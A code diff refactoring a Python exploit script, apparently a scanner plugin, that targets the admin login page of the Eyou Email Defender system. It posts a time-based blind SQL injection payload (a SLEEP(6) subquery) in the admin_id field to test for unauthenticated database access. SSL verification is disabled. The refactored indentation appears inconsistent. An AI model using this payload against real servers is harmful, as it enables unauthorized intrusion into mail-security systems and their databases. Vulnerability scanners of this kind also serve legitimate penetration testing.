@@ -11,14 +11,7 @@ import time
 import json
 import requests
 import warnings
-
-
-
-class admin_id_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['亿邮Email Defender系统免登陆DBA注入', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -27,7 +20,7 @@ class admin_id_sqli:
             "admin_id":"a' AND (SELECT * FROM (SELECT(SLEEP(6)))WAcW) AND 'oHiR'='oHiR",
             "admin_pass":"a"
             }
-        vulnurl = self.url + r"/php/admin_login.php"
+        vulnurl = url + r"/php/admin_login.php"
         start_time = time.time()
         try:
             req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
@@ -42,5 +35,5 @@ class admin_id_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = admin_id_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
